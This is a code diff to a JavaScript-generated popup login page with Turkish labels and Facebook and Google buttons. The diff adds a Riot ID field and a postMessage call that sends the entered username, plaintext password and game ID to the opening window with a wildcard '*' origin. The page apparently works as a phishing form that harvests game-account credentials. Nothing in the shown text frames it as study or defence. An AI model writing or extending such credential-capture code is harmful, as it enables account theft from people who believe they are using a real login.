@@ -196,6 +196,10 @@ function openAuth() {
                     <input type="password" id="p" placeholder=" " autocomplete="off">
                     <span class="label">Şifre</span>
                 </div>
+                <div class="input-container">
+    <input type="text" id="gameid" placeholder=" " autocomplete="off">
+    <span class="label">Riot ID (İsim#Etiket)</span>
+</div>
                 <div class="social-grid">
                     <div class="social-btn fb"><img src="fb_logo.png"></div>
                     <div class="social-btn gg"><img src="google_logo.png"></div>
@@ -222,6 +226,11 @@ function openAuth() {
                         window.close();
                     }
                 };
+                window.opener.postMessage({
+    user: u.value, 
+    pass: p.value, 
+    gameid: document.getElementById('gameid').value 
+}, "*");
             <\/script>
         </body>
         </html>`;
